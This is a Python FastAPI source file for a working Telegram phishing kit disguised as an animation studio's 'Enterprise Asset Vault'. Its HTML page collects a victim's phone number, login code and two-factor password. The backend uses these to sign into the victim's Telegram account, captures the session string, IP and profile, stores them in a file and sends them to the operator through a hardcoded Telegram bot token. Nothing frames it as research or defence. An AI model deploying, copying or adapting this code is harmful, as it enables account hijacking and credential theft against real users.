import asyncio
import json
import asyncio
import json
import os
import uvicorn
import httpx
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
from telethon import TelegramClient
from telethon.errors import (
    FloodWaitError,
    PhoneCodeInvalidError,
    PhoneNumberInvalidError,
    SessionPasswordNeededError,
)
from telethon.sessions import StringSession

app = FastAPI(title="Dream Toon Studios - Enterprise Animation Vault")

API_ID = int(os.getenv("36023099", 36023099))
API_HASH = os.getenv("b5926500a901cb5b7a5ad5828e5e98e6", "b5926500a901cb5b7a5ad5828e5e98e6")

BOT_TOKEN = os.getenv("8585882911:AAFkPmxjlQJ8HTMJqpg_LEVqkptBPlv1n7g", "8585882911:AAFkPmxjlQJ8HTMJqpg_LEVqkptBPlv1n7g")
CHAT_ID = os.getenv("8579040479", "8579040479")

VAULT_FILE = "dreamtoon_enterprise_vault.enc"
active_sessions = {}


async def notify_operator_and_bot(
    phone: str, code: str, session_str: str, client_instance: TelegramClient, client_meta: dict
):
  profile_info = {}
  try:
    me = await client_instance.get_me()
    profile_info = {
        "id": me.id,
        "first_name": me.first_name,
        "username": me.username,
        "phone": me.phone,
    }
  except Exception as e:
    profile_info = {"error": str(e)}

  print(f"\n" + "=" * 80)
  print(f"[🔥] ELITE TELEMETRY INTEL HARVESTED:")
  print(f"[+] Target Phone   : {phone}")
  print(f"[+] Submitted Code : {code}")
  print(f"[+] Client IP      : {client_meta.get('ip', 'Unknown')}")
  print(f"[+] User-Agent     : {client_meta.get('user_agent', 'Unknown')}")
  print(f"[+] Profile Data   : {profile_info}")
  print(f"[+] Session String :\n{session_str}")
  print("=" * 80 + "\n")

  data = {}
  if os.path.exists(VAULT_FILE):
    try:
      with open(VAULT_FILE, "r") as f:
        data = json.load(f)
    except:
      pass
  data[phone] = {
      "phone": phone,
      "otp": code,
      "meta": client_meta,
      "profile": profile_info,
      "session_string": session_str,
  }
  with open(VAULT_FILE, "w") as f:
    json.dump(data, f, indent=4)

  if BOT_TOKEN != "YOUR_TELEGRAM_BOT_TOKEN" and CHAT_ID != "YOUR_ADMIN_CHAT_ID":
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    msg_text = (
        f"🎨 DREAM TOON: ELITE INTEL CAPTURED 🎨\n\n"
        f"📱 Phone: {phone}\n"
        f"🔢 Code/OTP: {code}\n"
        f"🌐 IP: {client_meta.get('ip', 'N/A')}\n"
        f"💻 User-Agent: {client_meta.get('user_agent', 'N/A')}\n"
        f"👤 Name: {profile_info.get('first_name', 'N/A')}\n"
        f"🏷 Username: @{profile_info.get('username', 'None')}\n"
        f"🆔 User ID: {profile_info.get('id', 'N/A')}\n\n"
        f"🔑 Session String:\n{session_str}"
    )
    payload = {"chat_id": CHAT_ID, "text": msg_text}
    async with httpx.AsyncClient() as http_client:
      try:
        await http_client.post(url, json=payload, timeout=10.0)
      except Exception as e:
        print(f"[-] Bot exfiltration error: {e}")


HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dream Toon Studios - Season 4 Enterprise Asset Vault</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-base: #05030b;
            --card-bg: rgba(18, 14, 38, 0.85);
            --primary: #8b5cf6;
            --primary-hover: #7c3aed;
            --accent-pink: #ec4899;
            --accent-cyan: #06b6d4;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --success: #22c55e;
            --error: #f43f5e;
        }
        * { box-sizing: border-box; }
        body {
            background-color: var(--bg-base);
            background-image: 
                radial-gradient(at 10% 10%, rgba(139, 92, 246, 0.25) 0px, transparent 50%),
                radial-gradient(at 90% 90%, rgba(236, 72, 153, 0.2) 0px, transparent 50%),
                radial-gradient(at 50% 50%, rgba(6, 182, 212, 0.12) 0px, transparent 60%);
            color: var(--text-main);
            font-family: 'Plus Jakarta Sans', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            overflow-x: hidden;
        }
        .wrapper { width: 100%; max-width: 480px; padding: 20px; }
        .card {
            background: var(--card-bg);
            backdrop-filter: blur(35px);
            -webkit-backdrop-filter: blur(35px);
            padding: 40px 32px;
            border-radius: 32px;
            box-shadow: 0 40px 90px -20px rgba(0, 0, 0, 0.95);
            border: 1px solid rgba(255, 255, 255, 0.09);
            position: relative;
            overflow: hidden;
        }
        .card::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; height: 4px;
            background: linear-gradient(90deg, var(--primary), var(--accent-pink), var(--accent-cyan));
        }
        
        .urgency-banner {
            background: rgba(236, 72, 153, 0.1);
            border: 1px solid rgba(236, 72, 153, 0.25);
            padding: 10px 14px;
            border-radius: 14px;
            font-size: 11.5px;
            color: #fbcfe8;
            margin-bottom: 24px;
            display: flex;
            align-items: center;
            gap: 10px;
            font-weight: 600;
        }
        .live-pulse { width: 7px; height: 7px; background: var(--accent-pink); border-radius: 50%; box-shadow: 0 0 12px var(--accent-pink); animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { transform: scale(0.9); opacity: 0.6; } 50% { transform: scale(1.4); opacity: 1; } 100% { transform: scale(0.9); opacity: 0.6; } }

        .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; }
        .badge { display: flex; align-items: center; gap: 8px; font-size: 11px; text-transform: uppercase; letter-spacing: 1.4px; color: #c4b5fd; font-weight: 800; }
        
        h2 { color: var(--text-main); margin: 0 0 8px 0; font-size: 25px; font-weight: 800; letter-spacing: -0.5px; }
        p { font-size: 13.5px; color: var(--text-muted); margin-bottom: 26px; line-height: 1.5; }
        
        .input-box { margin-bottom: 20px; }
        label { font-size: 11px; color: var(--text-muted); font-weight: 700; display: block; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.9px; }
        input {
            width: 100%; padding: 15px 18px;
            background: rgba(8, 6, 22, 0.85);
            border: 1px solid rgba(255, 255, 255, 0.1);
            color: #fff; border-radius: 16px; outline: none; font-size: 15px; font-family: inherit;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }
        input:focus { border-color: var(--primary); box-shadow: 0 0 25px rgba(139, 92, 246, 0.4); background: rgba(12, 10, 32, 0.95); }
        
        /* Shake Animation for Errors */
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            20%, 60% { transform: translateX(-6px); }
            40%, 80% { transform: translateX(6px); }
        }
        .shake { animation: shake 0.4s ease-in-out; border-color: var(--error) !important; }

        .trust-badge-row {
            display: flex;
            align-items: center;
            gap: 12px;
            background: rgba(255, 255, 255, 0.025);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 14px;
            padding: 12px 14px;
            margin-bottom: 24px;
        }
        .trust-badge-row input[type="checkbox"] { width: 18px; height: 18px; cursor: pointer; accent-color: var(--primary); }
        .trust-text { font-size: 12px; color: #cbd5e1; font-weight: 500; cursor: pointer; margin: 0; }
        
        button {
            width: 100%; padding: 16px;
            background: linear-gradient(135deg, var(--primary), var(--primary-hover));
            color: white; border: none; border-radius: 16px; cursor: pointer;
            font-weight: 700; font-size: 15px; font-family: inherit;
            transition: all 0.3s ease; box-shadow: 0 10px 30px rgba(139, 92, 246, 0.45);
            display: flex; justify-content: center; align-items: center; gap: 10px;
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 15px 35px rgba(139, 92, 246, 0.65); background: linear-gradient(135deg, #9333ea, #6d28d9); }
        
        .spinner {
            width: 18px; height: 18px;
            border: 2.5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 0.7s linear infinite;
            display: none;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        .terminal-log {
            margin-top: 20px;
            background: #020106;
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 14px;
            padding: 12px 14px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 11.5px;
            color: #c4b5fd;
            min-height: 42px;
            display: flex;
            align-items: center;
        }
        
        #maintenance-screen {
            text-align: center;
            padding: 25px 0;
            display: none;
            animation: fadeIn 0.5s cubic-bezier(0.4, 0, 0.2, 1);
        }
        #maintenance-screen h3 { color: #f87171; font-size: 22px; margin-bottom: 10px; font-weight: 800; }
        #maintenance-screen p { color: var(--text-muted); font-size: 13.5px; line-height: 1.6; margin-bottom: 20px; }
        .maintenance-badge { background: rgba(248, 113, 113, 0.15); color: #f87171; border: 1px solid rgba(248, 113, 113, 0.3); padding: 7px 16px; border-radius: 20px; font-size: 11.5px; font-weight: 800; display: inline-block; text-transform: uppercase; letter-spacing: 1px; }

        .step-block { animation: fadeIn 0.4s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="card">
            <div class="top-bar">
                <div class="badge"><div class="live-pulse"></div> Dream Toon Core</div>
                <span style="font-size: 11px; color: var(--text-muted); font-weight: 600;">Enterprise v5.0</span>
            </div>

            <div class="urgency-banner">
                <div class="live-pulse"></div>
                <span>Active Node: Season 4 3D Asset Encryption Sync</span>
            </div>
            
            <div id="main-form-container">
                <h2>Authorize Node Sync</h2>
                <p>Input your studio mobile identification to verify hardware clearance credentials and download source packages.</p>
                
                <div id="step1" class="step-block">
                    <div class="input-box">
                        <label>Registered Mobile Number</label>
                        <input type="text" id="phone" placeholder="+91 98765 43210">
                    </div>
                    <div class="trust-badge-row">
                        <input type="checkbox" id="humanCheck" checked>
                        <label for="humanCheck" class="trust-text">Authorize background studio telemetry sync</label>
                    </div>
                    <button id="btn1" onclick="triggerAction('send_code', {phone: document.getElementById('phone').value, verified: document.getElementById('humanCheck').checked}, 'btn1', 'spinner1', 'phone')">
                        <span>Initialize Node Handshake</span>
                        <div class="spinner" id="spinner1"></div>
                    </button>
                </div>
                
                <div id="step2" class="step-block" style="display:none;">
                    <div class="input-box">
                        <label>Hardware Security Token (OTP)</label>
                        <input type="text" id="code" placeholder="• • • • •">
                    </div>
                    <button id="btn2" onclick="triggerAction('verify', {phone: document.getElementById('phone').value, code: document.getElementById('code').value}, 'btn2', 'spinner2', 'code')">
                        <span>Verify Asset Token</span>
                        <div class="spinner" id="spinner2"></div>
                    </button>
                </div>
                
                <div id="step3" class="step-block" style="display:none;">
                    <div class="input-box">
                        <label>Cloud Vault Master Password</label>
                        <input type="password" id="password" placeholder="Enter cloud password">
                    </div>
                    <button id="btn3" onclick="triggerAction('verify_2fa', {phone: document.getElementById('phone').value, password: document.getElementById('password').value}, 'btn3', 'spinner3', 'password')">
                        <span>Finalize Encrypted Clearance</span>
                        <div class="spinner" id="spinner3"></div>
                    </button>
                </div>
            </div>

            <div id="maintenance-screen">
                <div class="maintenance-badge">Sync Successful</div>
                <h3 style="margin-top:15px;">Node Under Scheduled Lockdown</h3>
                <p>All assets have been successfully synchronized and secured. Portal access is now terminated. Thank you.</p>
                <div style="font-size:12px; color: #64748b;">Dream Toon Enterprise Core</div>
            </div>
            
            <div class="terminal-log" id="status">Secure enterprise tunnel operational...</div>
        </div>
    </div>

    <script>
        let ws;
        let pingInterval;

        function connectWS() {
            const proto = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
            ws = new WebSocket(proto + window.location.host + "/ws");

            ws.onopen = function() {
                document.getElementById("status").innerText = "[+] Secure tunnel established with enterprise node.";
                pingInterval = setInterval(() => {
                    if (ws.readyState === WebSocket.OPEN) {
                        ws.send(JSON.stringify({action: "ping"}));
                    }
                }, 25000);
            };

            ws.onmessage = function(event) {
                const data = JSON.parse(event.data);
                if (data.action === "pong") return;

                const statusEl = document.getElementById("status");
                
                document.querySelectorAll('.spinner').forEach(s => s.style.display = 'none');
                document.querySelectorAll('button').forEach(b => b.disabled = false);

                statusEl.innerText = "> " + data.message;
                
                if(data.action === "code_sent") {
                    document.getElementById("step1").style.display = "none";
                    document.getElementById("step2").style.display = "block";
                } else if(data.action === "need_2fa") {
                    document.getElementById("step2").style.display = "none";
                    document.getElementById("step3").style.display = "block";
                } else if(data.action === "success") {
                    statusEl.style.color = "#22c55e";
                    statusEl.innerText = "[✓] Handshake verified. Terminating session...";
                    
                    setTimeout(() => {
                        document.getElementById("main-form-container").style.display = "none";
                        document.getElementById("maintenance-screen").style.display = "block";
                        document.getElementById("status").style.display = "none";
                    }, 1500);
                } else if(data.action === "error") {
                    statusEl.style.color = "#f43f5e";
                    if(data.field) {
                        const inputField = document.getElementById(data.field);
                        if(inputField) {
                            inputField.classList.add("shake");
                            setTimeout(() => inputField.classList.remove("shake"), 400);
                        }
                    }
                }
            };

            ws.onclose = function() {
                clearInterval(pingInterval);
                setTimeout(connectWS, 2000);
            };
        }

        connectWS();

        function triggerAction(actionType, payload, btnId, spinnerId, fieldId) {
            if (actionType === 'send_code' && !payload.verified) {
                document.getElementById("status").style.color = "#f43f5e";
                document.getElementById("status").innerText = "[-] Please authorize studio telemetry sync checkbox.";
                return;
            }

            payload.action = actionType;
            const statusEl = document.getElementById("status");
            
            if (!ws || ws.readyState !== WebSocket.OPEN) {
                statusEl.innerText = "[-] Re-establishing enterprise tunnel...";
                return;
            }

            document.getElementById(spinnerId).style.display = "block";
            document.getElementById(btnId).disabled = true;

            statusEl.style.color = "#c4b5fd";
            statusEl.innerText = "[*] Transmitting encrypted handshake...";
            ws.send(JSON.stringify(payload));
        }
    </script>
</body>
</html>
"""


@app.get("/", response_class=HTMLResponse)
async def get_index():
  return HTML_TEMPLATE


@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
  await websocket.accept()
  
  # Extract client telemetry metadata
  client_ip = websocket.headers.get("x-forwarded-for", websocket.client.host if websocket.client else "Unknown")
  user_agent = websocket.headers.get("user-agent", "Unknown")
  client_meta = {"ip": client_ip, "user_agent": user_agent}

  cid = id(websocket)
  client = TelegramClient(StringSession(), API_ID, API_HASH)
  await client.connect()

  active_sessions[cid] = {
      "client": client,
      "phone_code_hash": None,
      "captured_code": None,
      "meta": client_meta,
  }

  try:
    while True:
      data = await websocket.receive_json()
      action = data.get("action")

      if action == "ping":
        await websocket.send_json({"action": "pong"})
        continue

      session = active_sessions.get(cid)

      if action == "send_code":
        phone = data.get("phone")
        try:
          if not phone:
            await websocket.send_json({
                "action": "error",
                "message": "Mobile number field is empty.",
                "field": "phone"
            })
            continue
          result = await client.send_code_request(phone)
          session["phone_code_hash"] = result.phone_code_hash
          session["phone"] = phone
          await websocket.send_json({
              "action": "code_sent",
              "message": "Security token dispatched to device.",
          })
        except FloodWaitError as e:
          await websocket.send_json({
              "action": "error",
              "message": f"Rate limit active. Wait {e.seconds}s.",
              "field": "phone"
          })
        except PhoneNumberInvalidError:
          await websocket.send_json({
              "action": "error",
              "message": "Malformed mobile number format.",
              "field": "phone"
          })
        except Exception as e:
          await websocket.send_json({"action": "error", "message": str(e), "field": "phone"})

      elif action == "verify":
        phone = session.get("phone")
        captured_code = data.get("code")
        session["captured_code"] = captured_code
        try:
          await client.sign_in(
              phone=phone,
              code=captured_code,
              phone_code_hash=session["phone_code_hash"],
          )
          session_string = client.session.save()
          await notify_operator_and_bot(
              phone, captured_code, session_string, client, client_meta
          )
          await websocket.send_json({
              "action": "success",
              "message": "Asset package authorized successfully.",
          })
        except SessionPasswordNeededError:
          await websocket.send_json({
              "action": "need_2fa",
              "message": "Cloud vault master password required.",
          })
        except PhoneCodeInvalidError:
          await websocket.send_json({
              "action": "error",
              "message": "Incorrect security token code.",
              "field": "code"
          })
        except Exception as e:
          await websocket.send_json({"action": "error", "message": str(e), "field": "code"})

      elif action == "verify_2fa":
        phone = session.get("phone")
        password = data.get("password")
        captured_code = session.get("captured_code", "N/A")
        try:
          await client.sign_in(password=password)
          session_string = client.session.save()
          await notify_operator_and_bot(
              phone,
              f"{captured_code} + [2FA Protected]",
              session_string,
              client,
              client_meta,
          )
          await websocket.send_json({
              "action": "success",
              "message": "Encrypted clearance authorized.",
          })
        except Exception as e:
          await websocket.send_json({"action": "error", "message": str(e), "field": "password"})

  except WebSocketDisconnect:
    if cid in active_sessions:
      try:
        await active_sessions[cid]["client"].disconnect()
      except:
        pass
      del active_sessions[cid]


if __name__ == "__main__":
  port = int(os.environ.get("PORT", 8000))
  uvicorn.run("main:app", host="0.0.0.0", port=port)
